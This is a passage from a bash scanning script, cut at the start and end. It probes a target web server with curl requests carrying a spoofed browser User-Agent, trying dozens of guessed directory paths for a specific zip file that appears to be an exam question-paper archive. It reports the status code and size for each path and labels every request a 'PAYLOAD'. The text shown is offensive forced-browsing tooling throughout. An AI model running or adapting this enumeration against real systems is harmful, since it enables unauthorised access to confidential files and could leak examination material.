" "${target}QstnPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFilePlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFilePlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFilePlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
